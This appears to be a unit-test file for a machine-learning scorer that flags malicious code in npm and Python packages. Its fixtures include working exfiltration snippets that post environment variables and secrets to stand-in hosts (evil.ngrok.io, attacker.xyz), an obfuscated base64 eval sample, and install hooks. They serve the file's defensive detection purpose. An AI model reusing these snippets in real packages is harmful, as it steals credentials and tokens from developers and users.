/**
 * Unit tests for the ML-based malicious code scoring pipeline.
 * Run with:  bun tests/ml-scoring-pipeline.test.ts
 *
 * Tests cover:
 *   1. extractStatFeatures  — statistical feature extraction (115-d)
 *   2. extractTriageFeatures — pattern-based triage features (68-d)
 *   3. buildFeatureVector    — vector assembly (183-d / 196-d)
 *   4. predictMaliciousProba — XGBoost inference
 *   5. getModelInfo          — model metadata
 *   6. scorePackage          — end-to-end pipeline
 *
 * No network calls. No LLM calls.
 */

import {
  extractStatFeatures,
  extractTriageFeatures,
  buildFeatureVector,
  type TriageFeatures,
  type PackageLevelFeatures,
} from '../src/supply-chain/ml/feature-extraction.js';
import {
  predictMaliciousProba,
  predictBatch,
  getModelInfo,
} from '../src/supply-chain/ml/xgboost-inference.js';
import { scorePackage, type PackageScore } from '../src/supply-chain/ml/scoring.js';
import type { PackageSource } from '../src/supply-chain/types.js';

// ── Test harness ─────────────────────────────────────────────────────────────

let passed = 0;
let failed = 0;

function assert(label: string, condition: boolean, detail = '') {
  if (condition) {
    console.log(`  \u2713 ${label}`);
    passed++;
  } else {
    console.error(`  \u2717 ${label}${detail ? '\n      got: ' + detail : ''}`);
    failed++;
  }
}

// ── Sample code snippets ─────────────────────────────────────────────────────

const BENIGN_CODE = `
import express from 'express';

const app = express();

app.get('/health', (req, res) => {
  res.json({ status: 'ok' });
});

app.listen(3000, () => {
  console.log('Server started on port 3000');
});
`;

const MALICIOUS_POSTINSTALL = `
const { execSync } = require('child_process');
const https = require('https');
const os = require('os');

const data = JSON.stringify({
  hostname: os.hostname(),
  env: process.env,
  user: os.userInfo(),
});

const req = https.request({
  hostname: 'evil.ngrok.io',
  method: 'POST',
  path: '/exfil',
}, () => {});

req.write(data);
req.end();
`;

const OBFUSCATED_EXEC = `
const payload = [104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109];
const url = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 101);
eval(Buffer.from('Y29uc29sZS5sb2coImhlbGxvIik=', 'base64').toString());
`;

const ENV_EXFIL_PYTHON = `
import os
import requests

secrets = {k: v for k, v in os.environ.items() if 'TOKEN' in k or 'KEY' in k or 'SECRET' in k}
requests.post('https://attacker.xyz/collect', json=secrets)
`;

const INSTALL_HOOK_PKG_JSON = `{
  "name": "totally-legit-pkg",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node setup.js",
    "postinstall": "node ./scripts/post.js"
  }
}`;

const EMPTY_CODE = '';
const SINGLE_CHAR = 'x';
const MINIFIED_JS = 'var a=1,b=2,c=function(){return a+b};module.exports=c;';

// ═══════════════════════════════════════════════════════════════════════════════
// 1. extractStatFeatures
// ═══════════════════════════════════════════════════════════════════════════════

console.log('\n── extractStatFeatures ──');

{
  const feats = extractStatFeatures(BENIGN_CODE);
  assert('returns 115-d vector for normal code', feats.length === 115, `length=${feats.length}`);
  assert('all values are finite numbers', feats.every(v => Number.isFinite(v)));
  assert('entropy is positive for non-trivial code', feats[0] > 0, `entropy=${feats[0]}`);
}

{
  const feats = extractStatFeatures(EMPTY_CODE);
  assert('returns 115-d zero vector for empty string', feats.length === 115, `length=${feats.length}`);
  assert('all zeros for empty input', feats.every(v => v === 0));
}

{
  const feats = extractStatFeatures(SINGLE_CHAR);
  assert('returns 115-d zero vector for single char', feats.length === 115, `length=${feats.length}`);
  assert('all zeros for single char input', feats.every(v => v === 0));
}

{
  const feats = extractStatFeatures(MALICIOUS_POSTINSTALL);
  assert('detects imports', feats[17] > 0, `importCount=${feats[17]}`);
  // entropy should be reasonable (3-5 bits for English-like code)
  assert('entropy in expected range', feats[0] > 3 && feats[0] < 7, `entropy=${feats[0]}`);
}

{
  const feats = extractStatFeatures(OBFUSCATED_EXEC);
  // Should have high digit ratio due to char codes
  assert('high digit ratio for obfuscated code', feats[7] > 0.1, `digitRatio=${feats[7]}`);
  // Should detect long base64 sequence
  assert('detects base64 sequences', feats[10] > 0, `longestBase64=${feats[10]}`);
}

// ═══════════════════════════════════════════════════════════════════════════════
// 2. extractTriageFeatures
// ═══════════════════════════════════════════════════════════════════════════════

console.log('\n── extractTriageFeatures ──');

{
  const result = extractTriageFeatures(BENIGN_CODE, 'src/index.ts');
  assert('returns 64 pattern counts', result.counts.length === 64, `counts.length=${result.counts.length}`);
  assert('benign code has low triage score', result.finalScore <= 5, `score=${result.finalScore}`);
  assert('few or no categories for benign code', result.nCategories <= 1, `cats=${result.nCategories}`);
}

{
  const result = extractTriageFeatures(MALICIOUS_POSTINSTALL, 'index.js');
  assert('malicious postinstall has high score', result.finalScore > 10, `score=${result.finalScore}`);
  assert('detects multiple threat categories', result.nCategories >= 2, `cats=${result.nCategories}`);
  // Should detect child-process, network, env patterns
  assert('totalScore > 0', result.totalScore > 0);
}

{
  const result = extractTriageFeatures(OBFUSCATED_EXEC, 'lib/helper.js');
  assert('detects obfuscation patterns', result.totalScore > 0, `score=${result.totalScore}`);
  // chr-obfuscation pattern should match String.fromCharCode (index 43 in pattern list)
  const chrIdx = 43;
  assert('detects chr obfuscation', result.counts[chrIdx] > 0, `chrCount=${result.counts[chrIdx]}`);
}

{
  const result = extractTriageFeatures(ENV_EXFIL_PYTHON, 'setup.py');
  assert('detects env exfiltration', result.nCategories >= 2, `cats=${result.nCategories}`);
  assert('python env exfil gets high score', result.finalScore > 5, `score=${result.finalScore}`);
}

{
  const result = extractTriageFeatures(INSTALL_HOOK_PKG_JSON, 'package.json:scripts');
  assert('install hooks detected in package.json', result.totalScore > 0, `score=${result.totalScore}`);
  assert('package.json gets 3x path adjustment', result.pathAdjust === 3.0, `pathAdjust=${result.pathAdjust}`);
  assert('finalScore reflects path multiplier', result.finalScore > result.totalScore, `final=${result.finalScore} total=${result.totalScore}`);
}

// Path adjustment tests
{
  const code = 'const x = eval("alert(1)");';
  const testResult = extractTriageFeatures(code, 'tests/foo.test.ts');
  const srcResult = extractTriageFeatures(code, 'src/main.ts');
  assert('test files get lower path adjustment (0.3)', testResult.pathAdjust === 0.3, `got=${testResult.pathAdjust}`);
  assert('src/main.ts gets high-value path adjustment (1.5)', srcResult.pathAdjust === 1.5, `got=${srcResult.pathAdjust}`);
  assert('test file score < src file score for same code', testResult.finalScore < srcResult.finalScore);
}

// ═══════════════════════════════════════════════════════════════════════════════
// 3. buildFeatureVector
// ═══════════════════════════════════════════════════════════════════════════════

console.log('\n── buildFeatureVector ──');

{
  const statFeats = extractStatFeatures(BENIGN_CODE);
  const triageFeats = extractTriageFeatures(BENIGN_CODE, 'index.ts');
  const vec = buildFeatureVector(statFeats, triageFeats);
  assert('base vector is 183-d (no pkg features)', vec.length === 183, `length=${vec.length}`);
  assert('all values are finite', vec.every(v => Number.isFinite(v)));
}

{
  const statFeats = extractStatFeatures(BENIGN_CODE);
  const triageFeats = extractTriageFeatures(BENIGN_CODE, 'index.ts');
  const pkgFeatures: PackageLevelFeatures = {
    maxTriageScore: 50,
    meanTriageScore: 10,
    sumTriageScore: 100,
    nChunks: 10,
    nFiles: 10,
    nChunksWithTriage: 3,
    fracWithTriage: 0.3,
    maxEntropy: 5.5,
    maxLineLen: 200,
    maxCategories: 4,
    hasInstallHook: 1,
    hasKnownC2: 0,
    scoreRatio: 0.5,
  };
  const vec = buildFeatureVector(statFeats, triageFeats, pkgFeatures);
  assert('vector with pkg features is 196-d', vec.length === 196, `length=${vec.length}`);
  // Verify pkg features are appended at the end
  assert('pkg maxTriageScore at index 183', vec[183] === 50, `got=${vec[183]}`);
  assert('pkg scoreRatio at index 195', vec[195] === 0.5, `got=${vec[195]}`);
}

{
  // Verify vector structure: stat(115) + counts(64) + triage scores(4)
  const statFeats = new Array(115).fill(0);
  statFeats[0] = 4.2; // entropy
  const triageFeats: TriageFeatures = {
    counts: new Array(64).fill(0),
    totalScore: 10,
    nCategories: 2,
    pathAdjust: 1.5,
    finalScore: 15,
  };
  triageFeats.counts[0] = 3; // first pattern

  const vec = buildFeatureVector(statFeats, triageFeats);
  assert('stat features at start (entropy at idx 0)', vec[0] === 4.2, `got=${vec[0]}`);
  assert('first pattern count at idx 115', vec[115] === 3, `got=${vec[115]}`);
  assert('totalScore at idx 179', vec[179] === 10, `got=${vec[179]}`);
  assert('nCategories at idx 180', vec[180] === 2, `got=${vec[180]}`);
  assert('pathAdjust at idx 181', vec[181] === 1.5, `got=${vec[181]}`);
  assert('finalScore at idx 182', vec[182] === 15, `got=${vec[182]}`);
}

// ═══════════════════════════════════════════════════════════════════════════════
// 4. XGBoost Inference
// ═══════════════════════════════════════════════════════════════════════════════

console.log('\n── XGBoost inference ──');

{
  const info = getModelInfo();
  assert('model has 183 features', info.numFeatures === 183, `got=${info.numFeatures}`);
  assert('model has > 0 trees', info.numTrees > 0, `got=${info.numTrees}`);
  assert('model has 604 trees', info.numTrees === 604, `got=${info.numTrees}`);
}

{
  // Benign code should get low probability
  const feats = buildFeatureVector(
    extractStatFeatures(BENIGN_CODE),
    extractTriageFeatures(BENIGN_CODE, 'src/index.ts'),
  ).slice(0, 183);
  const proba = predictMaliciousProba(feats);
  assert('probability is between 0 and 1', proba >= 0 && proba <= 1, `proba=${proba}`);
  assert('benign code gets low probability (< 0.5)', proba < 0.5, `proba=${proba}`);
}

{
  // Malicious code should get higher probability
  const feats = buildFeatureVector(
    extractStatFeatures(MALICIOUS_POSTINSTALL),
    extractTriageFeatures(MALICIOUS_POSTINSTALL, 'index.js'),
  ).slice(0, 183);
  const proba = predictMaliciousProba(feats);
  assert('malicious code gets probability > benign', proba > 0.1, `proba=${proba}`);
}

{
  // Zero vector should still produce valid output
  const zeroVec = new Array(183).fill(0);
  const proba = predictMaliciousProba(zeroVec);
  assert('zero vector produces valid probability', proba >= 0 && proba <= 1, `proba=${proba}`);
}

{
  // predictBatch should return same results as individual calls
  const feats1 = buildFeatureVector(
    extractStatFeatures(BENIGN_CODE),
    extractTriageFeatures(BENIGN_CODE, 'index.ts'),
  ).slice(0, 183);
  const feats2 = buildFeatureVector(
    extractStatFeatures(MALICIOUS_POSTINSTALL),
    extractTriageFeatures(MALICIOUS_POSTINSTALL, 'index.js'),
  ).slice(0, 183);

  const batchResult = predictBatch([feats1, feats2]);
  const individual1 = predictMaliciousProba(feats1);
  const individual2 = predictMaliciousProba(feats2);

  assert('batch returns correct count', batchResult.length === 2, `got=${batchResult.length}`);
  assert('batch[0] matches individual', Math.abs(batchResult[0] - individual1) < 1e-10);
  assert('batch[1] matches individual', Math.abs(batchResult[1] - individual2) < 1e-10);
}

// ═══════════════════════════════════════════════════════════════════════════════
// 5. scorePackage (end-to-end)
// ═══════════════════════════════════════════════════════════════════════════════

console.log('\n── scorePackage (end-to-end) ──');

{
  // Benign package
  const source: PackageSource = {
    name: 'safe-pkg',
    ecosystem: 'npm',
    version: '1.0.0',
    installScripts: {},
    fileList: ['index.js', 'lib/utils.js'],
    fileContents: {
      'index.js': BENIGN_CODE,
      'lib/utils.js': 'module.exports = { add: (a, b) => a + b };',
    },
    suspiciousFiles: {},
  };

  const content = new Map(Object.entries(source.fileContents));
  const result = scorePackage(source, undefined, content);

  assert('returns scoredFiles array', Array.isArray(result.scoredFiles));
  assert('scoredFiles count matches file count', result.scoredFiles.length === 2, `got=${result.scoredFiles.length}`);
  assert('maxFileProba is a valid probability', result.maxFileProba >= 0 && result.maxFileProba <= 1);
  assert('meanFileProba is a valid probability', result.meanFileProba >= 0 && result.meanFileProba <= 1);
  assert('maxFileProba >= meanFileProba', result.maxFileProba >= result.meanFileProba);
  assert('benign package has low max proba', result.maxFileProba < 0.5, `maxProba=${result.maxFileProba}`);
}

{
  // Mixed package: one malicious file, one benign
  const source: PackageSource = {
    name: 'sketchy-pkg',
    ecosystem: 'npm',
    version: '1.0.0',
    installScripts: {},
    fileList: ['index.js', 'postinstall.js'],
    fileContents: {
      'index.js': BENIGN_CODE,
      'postinstall.js': MALICIOUS_POSTINSTALL,
    },
    suspiciousFiles: { 'postinstall.js': MALICIOUS_POSTINSTALL },
  };

  const content = new Map(Object.entries(source.fileContents));
  const result = scorePackage(source, undefined, content);

  assert('mixed pkg: sorted by probability descending',
    result.scoredFiles[0].maliciousProba >= result.scoredFiles[1].maliciousProba);
  assert('mixed pkg: highest file is postinstall.js',
    result.scoredFiles[0].filePath === 'postinstall.js',
    `got=${result.scoredFiles[0].filePath}`);
  assert('mixed pkg: malicious file has higher proba than benign',
    result.scoredFiles[0].maliciousProba > result.scoredFiles[1].maliciousProba);
}

{
  // ScoredFile shape validation
  const source: PackageSource = {
    name: 'test-pkg',
    ecosystem: 'npm',
    version: '1.0.0',
    installScripts: {},
    fileList: ['index.js'],
    fileContents: { 'index.js': MALICIOUS_POSTINSTALL },
    suspiciousFiles: {},
  };

  const content = new Map(Object.entries(source.fileContents));
  const result = scorePackage(source, undefined, content);
  const file = result.scoredFiles[0];

  assert('scoredFile has filePath', typeof file.filePath === 'string');
  assert('scoredFile has maliciousProba', typeof file.maliciousProba === 'number');
  assert('scoredFile has triageScore', typeof file.triageScore === 'number');
  assert('scoredFile has nCategories', typeof file.nCategories === 'number');
  assert('scoredFile has matchedPatterns array', Array.isArray(file.matchedPatterns));
  assert('matchedPatterns has entries for malicious code', file.matchedPatterns.length > 0,
    `patterns=${JSON.stringify(file.matchedPatterns)}`);
  assert('matchedPatterns contains child-process', file.matchedPatterns.includes('child-process'),
    `patterns=${JSON.stringify(file.matchedPatterns)}`);
}

{
  // Empty package
  const source: PackageSource = {
    name: 'empty-pkg',
    ecosystem: 'npm',
    version: '1.0.0',
    installScripts: {},
    fileList: [],
    fileContents: {},
    suspiciousFiles: {},
  };

  const content = new Map<string, string>();
  const result = scorePackage(source, undefined, content);

  assert('empty package returns 0 files', result.scoredFiles.length === 0);
  assert('empty package maxFileProba is 0', result.maxFileProba === 0);
  assert('empty package meanFileProba is 0', result.meanFileProba === 0);
}

// ═══════════════════════════════════════════════════════════════════════════════
// 6. Discriminative power: malicious vs benign ranking
// ═══════════════════════════════════════════════════════════════════════════════

console.log('\n── Discriminative power ──');

{
  // The model should consistently rank known-malicious patterns higher than benign
  const maliciousSnippets = [
    { code: MALICIOUS_POSTINSTALL, path: 'postinstall.js', label: 'env exfil + network' },
    { code: OBFUSCATED_EXEC, path: 'lib/util.js', label: 'obfuscated exec' },
    { code: ENV_EXFIL_PYTHON, path: 'setup.py', label: 'python env exfil' },
  ];

  const benignSnippets = [
    { code: BENIGN_CODE, path: 'src/server.ts', label: 'express server' },
    { code: MINIFIED_JS, path: 'dist/bundle.min.js', label: 'minified JS' },
    { code: '# Hello World\n\nThis is a readme.\n', path: 'README.md', label: 'readme' },
  ];

  const malProbs: number[] = [];
  const benProbs: number[] = [];

  for (const { code, path, label } of maliciousSnippets) {
    const feats = buildFeatureVector(
      extractStatFeatures(code),
      extractTriageFeatures(code, path),
    ).slice(0, 183);
    const p = predictMaliciousProba(feats);
    malProbs.push(p);
    console.log(`    malicious "${label}": proba=${p.toFixed(4)}`);
  }

  for (const { code, path, label } of benignSnippets) {
    const feats = buildFeatureVector(
      extractStatFeatures(code),
      extractTriageFeatures(code, path),
    ).slice(0, 183);
    const p = predictMaliciousProba(feats);
    benProbs.push(p);
    console.log(`    benign "${label}": proba=${p.toFixed(4)}`);
  }

  const minMal = Math.min(...malProbs);
  const maxBen = Math.max(...benProbs);
  assert('all malicious probas > all benign probas', minMal > maxBen,
    `min malicious=${minMal.toFixed(4)}, max benign=${maxBen.toFixed(4)}`);
}

// ═══════════════════════════════════════════════════════════════════════════════
// Summary
// ═══════════════════════════════════════════════════════════════════════════════

console.log('\n' + '═'.repeat(70));
console.log(`  ML Scoring Pipeline: ${passed} passed, ${failed} failed`);
console.log('═'.repeat(70) + '\n');

if (failed > 0) {
  process.exit(1);
}
